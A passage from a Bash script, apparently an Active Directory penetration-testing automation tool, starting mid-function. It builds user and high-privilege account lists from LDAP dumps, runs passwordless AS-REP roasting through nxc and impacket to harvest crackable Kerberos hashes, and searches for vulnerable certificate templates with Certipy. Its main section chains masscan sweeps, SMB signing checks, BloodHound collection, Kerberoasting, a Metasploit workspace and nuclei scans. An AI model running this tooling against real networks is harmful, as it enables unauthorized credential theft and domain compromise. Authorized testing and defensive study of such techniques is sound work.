    if [[ -n "$udump" && -f "$udump" ]]; then
        echo -e "${CYAN}Parsing ${udump}${NC}"

        # Find a python that actually runs (a bare name on PATH is not enough)
        local pybin="" cand
        for cand in python3 python; do
            if command -v "$cand" &> /dev/null && "$cand" -c 'import json' > /dev/null 2>&1; then
                pybin="$cand"
                break
            fi
        done

        local parsed=false

        if [[ -n "$pybin" ]]; then
            local hp_groups_str
            hp_groups_str=$(printf '%s\n' "${HIGH_PRIV_GROUPS[@]}")
            HP_GROUPS="$hp_groups_str" "$pybin" - "$udump" "$gdump" "sam-names.txt" "$hp_tmp" > /dev/null <<'PYEOF'
import json, os, re, sys

users_path = sys.argv[1]
groups_path = sys.argv[2] if len(sys.argv) > 2 else ''
sam_out = sys.argv[3]
hp_out = sys.argv[4]

hp_groups = set(g.strip().lower() for g in os.environ.get('HP_GROUPS', '').split('\n') if g.strip())
PRIV_PGID = {'512', '516', '518', '519', '520'}


def load(path):
    if not path or not os.path.isfile(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as fh:
            data = json.load(fh)
    except Exception:
        return []
    if isinstance(data, dict):
        for key in ('entries', 'items', 'data'):
            if isinstance(data.get(key), list):
                return data[key]
        return [data]
    return data if isinstance(data, list) else []


def attrs_of(entry):
    if not isinstance(entry, dict):
        return {}
    inner = entry.get('attributes')
    return inner if isinstance(inner, dict) else entry


def val(attrs, name):
    for k in attrs:
        if k.lower() == name.lower():
            return attrs[k]
    return None


def as_list(v):
    if v is None:
        return []
    return v if isinstance(v, list) else [v]


def first_str(v):
    for item in as_list(v):
        if isinstance(item, (str, int)):
            return str(item).strip()
    return ''


def cn_of(dn):
    m = re.match(r'\s*CN=([^,]+)', str(dn), re.I)
    return m.group(1).strip().lower() if m else ''


dn_to_sam, sams, high = {}, [], set()

for entry in load(users_path):
    a = attrs_of(entry)
    sam = first_str(val(a, 'sAMAccountName'))
    if not sam or sam.endswith('$'):
        continue
    dn = ''
    if isinstance(entry, dict):
        dn = entry.get('dn') or ''
    if not dn:
        dn = first_str(val(a, 'distinguishedName'))
    if dn:
        dn_to_sam[str(dn).lower()] = sam
    sams.append(sam)

    if first_str(val(a, 'adminCount')) == '1':
        high.add(sam)
    elif first_str(val(a, 'primaryGroupID')) in PRIV_PGID:
        high.add(sam)
    elif any(cn_of(g) in hp_groups for g in as_list(val(a, 'memberOf'))):
        high.add(sam)

# Members listed on the group object itself (catches users whose memberOf is not populated)
for group in load(groups_path):
    a = attrs_of(group)
    name = (first_str(val(a, 'sAMAccountName')) or first_str(val(a, 'cn'))
            or first_str(val(a, 'name'))).strip().lower()
    if name not in hp_groups:
        continue
    for member in as_list(val(a, 'member')):
        sam = dn_to_sam.get(str(member).lower())
        if sam:
            high.add(sam)


def write(path, items):
    items = sorted(set(items), key=lambda s: s.lower())
    with open(path, 'w', encoding='utf-8') as fh:
        for item in items:
            fh.write(item + '\n')
    return len(items)


print('%d %d' % (write(sam_out, sams), write(hp_out, high)))
PYEOF
            if [[ $? -eq 0 && -s "sam-names.txt" ]]; then
                parsed=true
            else
                echo -e "${YELLOW}${pybin} could not parse the dump, trying another method...${NC}"
            fi
        fi

        if [[ "$parsed" == "false" ]] && command -v jq &> /dev/null; then
            local re
            re=$(printf '%s|' "${HIGH_PRIV_GROUPS[@]}")
            re="(${re%|})"
            jq -r '[.. | objects | select(has("sAMAccountName"))] | .[]
                   | (.sAMAccountName | if type=="array" then .[0] else . end)' "$udump" 2>/dev/null \
                | grep -v '\$$' | sort -uf > "sam-names.txt"
            jq -r --arg re "$re" '[.. | objects | select(has("sAMAccountName"))] | .[]
                   | select( ((.adminCount? // "") | tostring | test("1"))
                             or ((.memberOf? // []) | tostring | test($re; "i"))
                             or ((.primaryGroupID? // "") | tostring | test("51[26890]")) )
                   | (.sAMAccountName | if type=="array" then .[0] else . end)' "$udump" 2>/dev/null \
                | grep -v '\$$' | sort -uf >> "$hp_tmp"
            [[ -s "sam-names.txt" ]] && parsed=true
        fi

        if [[ "$parsed" == "false" ]]; then
            echo -e "${YELLOW}No working python3/jq — falling back to a plain text scan (names only).${NC}"
            grep -o '"sAMAccountName":[[:space:]]*\[\?[[:space:]]*"[^"]*"' "$udump" \
                | sed 's/.*"\([^"]*\)"$/\1/' | grep -v '\$$' | sort -uf > "sam-names.txt"
        fi
    else
        echo -e "${YELLOW}No ldapdomaindump JSON found in ldapdomdump/ — user lists cannot be built from it.${NC}"
    fi

    not_interrupted || { rm -f "$hp_tmp"; return 130; }

    # --- Extra high-priv sources (adminCount=1 straight from the DC) ---
    local dcip=""
    [[ -f "p389.txt" && -s "p389.txt" ]] && dcip=$(head -n1 "p389.txt")

    if [[ -n "$dcip" && -n "$LDAP_USERNAME" && -n "$LDAP_PASSWORD" && -n "$LDAP_DOMAIN" \
          && "$LDAP_SKIP_DOWNSTREAM_LDAP_OPS" != "true" ]]; then

        if command -v ldapsearch &> /dev/null; then
            local basedn
            basedn=$(echo "$LDAP_DOMAIN" | sed 's/^/DC=/; s/\./,DC=/g')
            echo -e "${CYAN}Querying adminCount=1 accounts via ldapsearch (${basedn})...${NC}"
            ldapsearch -o nettimeout=10 -o ldif-wrap=no -x -H "ldap://${dcip}" \
                -D "${LDAP_USERNAME}@${LDAP_DOMAIN}" -w "${LDAP_PASSWORD}" -b "$basedn" \
                "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName 2>/dev/null \
                | grep -i '^sAMAccountName:' | sed 's/^[^:]*:[[:space:]]*//' >> "$hp_tmp"
        fi

        not_interrupted || { rm -f "$hp_tmp"; return 130; }

        if command -v nxc &> /dev/null && [[ ! -s "$hp_tmp" ]]; then
            echo -e "${CYAN}Trying nxc --admin-count...${NC}"
            nxc ldap "$dcip" -u "$LDAP_USERNAME" -p "$LDAP_PASSWORD" -d "$LDAP_DOMAIN" \
                --admin-count > "nxc-admincount.log" 2>&1
            grep -v '\[\*\]\|\[+\]\|\[-\]' "nxc-admincount.log" 2>/dev/null \
                | awk 'NF>=5 {print $NF}' | grep -v '^$' >> "$hp_tmp"
        fi
    fi

    # --- Write the results ---
    if [[ -s "sam-names.txt" ]]; then
        sort -uf "sam-names.txt" -o "sam-names.txt"
        echo -e "${GREEN}✅ $(wc -l < sam-names.txt) account name(s) -> sam-names.txt${NC}"
    else
        rm -f "sam-names.txt"
        echo -e "${YELLOW}No account names could be extracted.${NC}"
    fi

    if [[ -s "$hp_tmp" ]]; then
        grep -v '^[[:space:]]*$' "$hp_tmp" | sort -uf > "high-priv-accounts.txt"
        echo -e "${GREEN}✅ $(wc -l < high-priv-accounts.txt) high privileged account(s) -> high-priv-accounts.txt${NC}"
        head -n 10 "high-priv-accounts.txt" | while IFS= read -r n; do echo -e "  ${WHITE}${n}${NC}"; done
        [[ $(wc -l < "high-priv-accounts.txt") -gt 10 ]] && echo -e "  ${CYAN}...${NC}"
    else
        echo -e "${YELLOW}No high privileged accounts identified.${NC}"
    fi
    rm -f "$hp_tmp"
}

# AS-REP roasting with the harvested user list and NO password
asrep_roast_userlist() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== AS-REP ROASTING (user list, no password) ===${NC}"

    if [[ ! -f "sam-names.txt" || ! -s "sam-names.txt" ]]; then
        echo -e "${YELLOW}sam-names.txt not found or empty. Skipping AS-REP roasting from user list.${NC}"
        return 0
    fi

    if [[ ! -f "p389.txt" || ! -s "p389.txt" ]]; then
        echo -e "${YELLOW}No DC IPs in p389.txt. Cannot run AS-REP roasting.${NC}"
        return 0
    fi

    mkdir -p "kerberos"
    local dcip out tool_ran=false
    dcip=$(head -n1 "p389.txt")
    out="kerberos/as-rep-roast.txt"
    echo -e "${CYAN}DC: ${dcip}   Users: $(wc -l < sam-names.txt)${NC}"

    if command -v nxc &> /dev/null; then
        echo -e "${YELLOW}Running nxc AS-REP roasting (no password)...${NC}"
        local nxc_args=(ldap "$dcip" -u "sam-names.txt" -p '' --asreproast "$out")
        [[ -n "$LDAP_DOMAIN" ]] && nxc_args+=(-d "$LDAP_DOMAIN")
        nxc "${nxc_args[@]}" > "kerberos/as-rep-roast-nxc.log" 2>&1
        tool_ran=true
        not_interrupted || return 130

        if [[ -s "$out" ]]; then
            echo -e "${GREEN}✅ nxc: $(wc -l < "$out") AS-REP hash(es) -> ${out}${NC}"
            return 0
        fi
        echo -e "${YELLOW}nxc returned no hashes (see kerberos/as-rep-roast-nxc.log).${NC}"
    else
        echo -e "${YELLOW}nxc (netexec) not installed.${NC}"
    fi

    # impacket fallback — same idea, user list without credentials
    if command -v impacket-GetNPUsers &> /dev/null && [[ -n "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}Trying impacket-GetNPUsers with the user list...${NC}"
        impacket-GetNPUsers "${LDAP_DOMAIN}/" -dc-ip "$dcip" -no-pass -usersfile "sam-names.txt" \
            -format hashcat -outputfile "$out" > "kerberos/as-rep-roast-impacket.log" 2>&1
        tool_ran=true
        not_interrupted || return 130
    fi

    if [[ -s "$out" ]]; then
        echo -e "${GREEN}✅ $(wc -l < "$out") AS-REP hash(es) -> ${out}${NC}"
    elif [[ "$tool_ran" == "true" ]]; then
        rm -f "$out"
        echo -e "${YELLOW}No AS-REP roastable account found (all users require pre-auth).${NC}"
    else
        rm -f "$out"
        echo -e "${RED}❌ Neither nxc nor impacket-GetNPUsers is available — AS-REP roasting not performed.${NC}"
    fi
}

# Certipy AD CS enumeration -> certipy/
certipy_find() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== CERTIPY (AD CS) ===${NC}"

    if [[ "$LDAP_SKIP_DOWNSTREAM_LDAP_OPS" == "true" ]]; then
        echo -e "${YELLOW}Skipping Certipy (credentials not validated or user declined re-entry).${NC}"
        return 0
    fi

    if [[ -z "$LDAP_USERNAME" || -z "$LDAP_PASSWORD" || -z "$LDAP_DOMAIN" ]]; then
        echo -e "${YELLOW}Credentials not provided (-u / -p / -d). Skipping Certipy.${NC}"
        return 0
    fi

    if [[ ! -f "p389.txt" || ! -s "p389.txt" ]]; then
        echo -e "${YELLOW}No DC IPs in p389.txt. Skipping Certipy.${NC}"
        return 0
    fi

    local bin=""
    if command -v certipy-ad &> /dev/null; then
        bin="certipy-ad"
    elif command -v certipy &> /dev/null; then
        bin="certipy"
    else
        echo -e "${YELLOW}certipy-ad not installed (pip install certipy-ad). Skipping.${NC}"
        return 0
    fi

    mkdir -p "certipy"
    local dcip scheme rc
    dcip=$(head -n1 "p389.txt")
    echo -e "${CYAN}DC: ${dcip}   User: ${LDAP_USERNAME}@${LDAP_DOMAIN}${NC}"

    for scheme in ldap ldaps; do
        not_interrupted || return 130
        echo -e "${YELLOW}Running ${bin} find -vulnerable -ldap-scheme ${scheme}...${NC}"

        # Run inside certipy/ so every generated report lands there
        ( cd "certipy" && "$bin" find -u "${LDAP_USERNAME}@${LDAP_DOMAIN}" -p "${LDAP_PASSWORD}" \
            -dc-ip "${dcip}" -vulnerable -ldap-scheme "${scheme}" ) \
            > "certipy/certipy-find-${scheme}.log" 2>&1
        rc=$?
        not_interrupted || return 130

        if [[ $rc -eq 0 ]] && ! grep -qi "error\|traceback" "certipy/certipy-find-${scheme}.log"; then
            echo -e "${GREEN}✅ Certipy (${scheme}) completed — output in certipy/${NC}"
            local esc
            esc=$(grep -o 'ESC[0-9]*' "certipy"/*.txt "certipy/certipy-find-${scheme}.log" 2>/dev/null | sed 's/.*://' | sort -u | tr '\n' ' ')
            if [[ -n "$esc" ]]; then
                echo -e "${RED}⚠ Vulnerable template classes found: ${WHITE}${esc}${NC}"
            else
                echo -e "${CYAN}No vulnerable template reported.${NC}"
            fi
            return 0
        fi

        echo -e "${RED}❌ Certipy with ${scheme} failed (see certipy/certipy-find-${scheme}.log)${NC}"
    done

    echo -e "${YELLOW}Certipy could not enumerate AD CS (is a CA present?).${NC}"
}

# Reuse an existing masscan output instead of scanning (--mass-result)
import_mass_result() {
    echo -e "${BOLD}${BLUE}=== USING EXISTING MASSCAN RESULT ===${NC}"
    echo -e "${WHITE}Source:${NC} $MASS_RESULT_INPUT"

    if [[ ! -f "$MASS_RESULT_INPUT" ]]; then
        echo -e "${RED}Error: mass-result file not found: $MASS_RESULT_INPUT${NC}"
        return 1
    fi

    if [[ "$(readlink -f "$MASS_RESULT_INPUT" 2>/dev/null)" != "$(readlink -f "$MASS_RESULT_FILE" 2>/dev/null)" ]]; then
        cp -f "$MASS_RESULT_INPUT" "$MASS_RESULT_FILE"
        echo -e "${GREEN}Copied to ${MASS_RESULT_FILE}${NC}"
    else
        echo -e "${CYAN}Already using ${MASS_RESULT_FILE}${NC}"
    fi

    local line_count host_count
    line_count=$(grep -c "Discovered open port" "$MASS_RESULT_FILE" 2>/dev/null)
    host_count=$(grep "Discovered open port" "$MASS_RESULT_FILE" 2>/dev/null | awk '{print $6}' | sort -u | wc -l)

    if [[ "${line_count:-0}" -eq 0 ]]; then
        echo -e "${YELLOW}Warning: no 'Discovered open port' lines found — is this a masscan list output?${NC}"
    else
        echo -e "${GREEN}✅ ${line_count} open port record(s) across ${host_count} host(s) imported${NC}"
    fi
    echo -e "${YELLOW}Skipping host discovery and port scanning — continuing as if the scan already ran.${NC}"
    echo ""
}

# Detailed masscan (writes mass-result.txt)
detailed_masscan() {
    echo -e "${BOLD}${BLUE}=== DETAILED PORT SCAN ===${NC}"
    echo -e "${YELLOW}Starting detailed port scan on all IPs...${NC}"
    echo -e "${WHITE}IP File:${NC} $IP_FILE"
    echo -e "${WHITE}Rate:${NC} $RATE"
    echo -e "${WHITE}Ports:${NC} $PORTS"
    echo -e "${CYAN}Results will be saved to ${MASS_RESULT_FILE} file...${NC}"
    echo ""

    local paused="paused-detailed.conf"

    if [[ -f "$paused" ]]; then
        echo -e "${CYAN}Resuming interrupted masscan (${paused}) — previous results are kept.${NC}"
        sudo masscan --resume "$paused" >> "$MASS_RESULT_FILE"
    else
        sudo masscan -p "$PORTS" --rate="$RATE" -iL "$IP_FILE" > "$MASS_RESULT_FILE"
    fi

    if [[ -f "paused.conf" ]]; then
        mv -f "paused.conf" "$paused"
    elif not_interrupted; then
        # Only a scan that ran to completion clears the saved pause state
        rm -f "$paused"
    fi

    not_interrupted || return 130

    echo -e "${GREEN}Detailed scan completed! Results saved to ${MASS_RESULT_FILE} file.${NC}"
}

# Port-based file creation (p<port>.txt, web URL files, all-webs.txt)
create_port_files() {
    echo -e "${PURPLE}Creating port-based files...${NC}"

    if [[ ! -f "$MASS_RESULT_FILE" ]]; then
        echo -e "${RED}${MASS_RESULT_FILE} not found — nothing to process.${NC}"
        return 1
    fi

    # Ports actually seen in the scan output (union with the configured list keeps
    # imported --mass-result files with non-default ports working)
    local found_ports
    found_ports=$(grep "Discovered open port" "$MASS_RESULT_FILE" 2>/dev/null | awk '{print $4}' | cut -d '/' -f 1 | sort -un)

    if [[ -z "$found_ports" ]]; then
        echo -e "${YELLOW}No open ports found in ${MASS_RESULT_FILE}.${NC}"
        return 0
    fi

    local port
    for port in $found_ports; do
        not_interrupted || return 130

        # Filter, sort and save IP addresses (one IP per line)
        grep " $port/" "$MASS_RESULT_FILE" | cut -d " " -f 6 | sort -uV > "p${port}.txt"

        if [[ -s "p${port}.txt" ]]; then
            ip_count=$(wc -l < "p${port}.txt")
            echo -e "${GREEN}Found $ip_count IP addresses for port $port -> p${port}.txt${NC}"

            # Create HTTP/HTTPS URL file if it's a browser-reachable port
            if [[ -n "${WEB_PORTS[$port]}" ]]; then
                protocol="${WEB_PORTS[$port]}"
                emit_web_urls "$port" "$protocol" "p${port}.txt" > "p${port}-${protocol}.txt"
                echo -e "${CYAN}  -> Web URL file created: p${port}-${protocol}.txt ($(head -n1 "p${port}-${protocol}.txt"))${NC}"
            fi
        else
            rm -f "p${port}.txt"
        fi
    done

    # Create all-webs.txt combining all web URLs
    > "all-webs.txt"
    for port in $(printf '%s\n' "${!WEB_PORTS[@]}" | sort -n); do
        if [[ -f "p${port}.txt" && -s "p${port}.txt" ]]; then
            emit_web_urls "$port" "${WEB_PORTS[$port]}" "p${port}.txt" >> "all-webs.txt"
        fi
    done

    if [[ -s "all-webs.txt" ]]; then
        all_web_count=$(wc -l < "all-webs.txt")
        echo -e "${GREEN}✅ all-webs.txt created with $all_web_count URLs${NC}"
    else
        echo -e "${YELLOW}No web URLs found, removing empty all-webs.txt${NC}"
        rm -f "all-webs.txt"
    fi

    echo -e "${GREEN}Port-based file creation completed!${NC}"
}

# Web ports summary
web_ports_summary() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== WEB PORTS SUMMARY ===${NC}"

    local port

    echo -e "${BOLD}${CYAN}HTTP Ports:${NC}"
    for port in $(printf '%s\n' "${!WEB_PORTS[@]}" | sort -n); do
        [[ "${WEB_PORTS[$port]}" == "http" ]] || continue
        if [[ -f "p${port}-http.txt" && -s "p${port}-http.txt" ]]; then
            url_count=$(wc -l < "p${port}-http.txt")
            echo -e "${WHITE}  Port $port:${NC} $url_count URLs -> p${port}-http.txt"
        fi
    done

    echo ""
    echo -e "${BOLD}${CYAN}HTTPS Ports:${NC}"
    for port in $(printf '%s\n' "${!WEB_PORTS[@]}" | sort -n); do
        [[ "${WEB_PORTS[$port]}" == "https" ]] || continue
        if [[ -f "p${port}-https.txt" && -s "p${port}-https.txt" ]]; then
            url_count=$(wc -l < "p${port}-https.txt")
            echo -e "${WHITE}  Port $port:${NC} $url_count URLs -> p${port}-https.txt"
        fi
    done
}

# Final summary of everything produced
final_summary() {
    echo ""
    echo -e "${BOLD}${GREEN}=== RUN COMPLETE ===${NC}"
    [[ -f "up-ips.txt" ]]                        && echo -e "  ${WHITE}up-ips.txt${NC}                       $(wc -l < up-ips.txt) active host(s)"
    [[ -f "all-webs.txt" ]]                      && echo -e "  ${WHITE}all-webs.txt${NC}                     $(wc -l < all-webs.txt) web URL(s)"
    [[ -f "smb-signing-disabled-devices.txt" ]]  && echo -e "  ${WHITE}smb-signing-disabled-devices.txt${NC} $(wc -l < smb-signing-disabled-devices.txt) host(s) without SMB signing"
    [[ -f "p389.txt" ]]                          && echo -e "  ${WHITE}p389.txt${NC}                         $(wc -l < p389.txt) DC/LDAP host(s)"
    [[ -f "sam-names.txt" ]]                     && echo -e "  ${WHITE}sam-names.txt${NC}                    $(wc -l < sam-names.txt) account name(s)"
    [[ -f "high-priv-accounts.txt" ]]            && echo -e "  ${WHITE}high-priv-accounts.txt${NC}           $(wc -l < high-priv-accounts.txt) high privileged account(s)"
    [[ -f "kerberos/as-rep-roast.txt" ]]         && echo -e "  ${WHITE}kerberos/as-rep-roast.txt${NC}        $(wc -l < kerberos/as-rep-roast.txt) AS-REP hash(es)"
    [[ -d "certipy" ]]                           && echo -e "  ${WHITE}certipy/${NC}                         AD CS enumeration output"
    [[ "$MSF_WORKSPACE_READY" == "true" ]]       && echo -e "  ${WHITE}msf workspace${NC}                    ${MSF_PROJECT}"
    echo ""
}

# =====================================================================
#  MAIN
# =====================================================================

init_state

# Asked up front: Metasploit DB check + workspace named after the project
run_stage msfsetup "Metasploit DB check & workspace" metasploit_setup

case "$COMMAND" in
    "check")
        run_stage hostdiscovery "Host Discovery" host_discovery
        run_stage upips "Active host list (up-ips.txt)" update_up_ips
        run_stage smbsigning "SMB signing check" smb_signing_check

        # Run Kerberos implementation after check if flag is set (uses IP file directly)
        if [[ "$KERBEROS_IMPL" == "true" ]]; then
            run_stage kerberos "Kerberos Implementation" kerberos_implementation
        fi
        # Run Kerberoasting and ASREP-roasting if credentials are provided
        run_stage roasting "Kerberoasting & ASREP-roasting" kerberoasting_asreproasting
        # AS-REP roasting from an existing sam-names.txt (no password needed)
        run_stage asrepnames "AS-REP roasting from sam-names.txt" asrep_roast_userlist
        # AD CS enumeration (skips itself without credentials / DC)
        run_stage certipy "Certipy AD CS enumeration" certipy_find
        # Prompt for nuclei scan
        run_stage nuclei "Nuclei scan" nuclei_scan_prompt
        ;;

    "start")
        if [[ -n "$MASS_RESULT_INPUT" ]]; then
            run_stage massimport "Import existing masscan result" import_mass_result
            if [[ $? -ne 0 ]]; then
                echo -e "${RED}Could not import mass-result file. Aborting.${NC}"
                exit 1
            fi
        else
            if [[ "$SKIP_HOST_CHECK" == "true" ]]; then
                echo -e "${YELLOW}--skip-host-check given: host discovery phase skipped.${NC}"
            else
                run_stage hostdiscovery "Host Discovery" host_discovery
                if [[ $? -ne 0 ]]; then
                    echo -e "${RED}Host discovery failed. Cannot perform detailed scan.${NC}"
                    echo -e "${CYAN}Use ${WHITE}--skip-host-check${CYAN} to scan anyway.${NC}"
                    exit 1
                fi
            fi

            run_stage masscan "Detailed port scan" detailed_masscan
        fi

        run_stage portfiles "Port-based file creation" create_port_files
        run_stage upips "Active host list (up-ips.txt)" update_up_ips
        run_stage dcverify "Domain Controller verification" filter_verified_domain_controllers
        run_stage smbsigning "SMB signing check" smb_signing_check

        # Credential gate is intentionally not stage-tracked: it must run on every
        # resume, because the downstream LDAP steps depend on its result.
        INTERRUPT_ACTION=""
        ldap_credentials_validation_gate

        web_ports_summary

        run_stage ldapdump "LDAP domain dump" ldap_domain_dump
        run_stage userlists "User lists (sam-names / high-priv-accounts)" build_user_lists
        run_stage bloodhound "BloodHound collection" bloodhound_dump
        run_stage roasting "Kerberoasting & ASREP-roasting" kerberoasting_asreproasting
        run_stage asrepnames "AS-REP roasting from sam-names.txt" asrep_roast_userlist
        run_stage certipy "Certipy AD CS enumeration" certipy_find

        if [[ "$KERBEROS_IMPL" == "true" ]]; then
            run_stage kerberos "Kerberos Implementation" kerberos_implementation
        fi

        run_stage nuclei "Nuclei scan" nuclei_scan_prompt
        ;;
esac

final_summary

# All steps finished — drop the resume state so the next run starts clean
rm -f "$STATE_FILE"
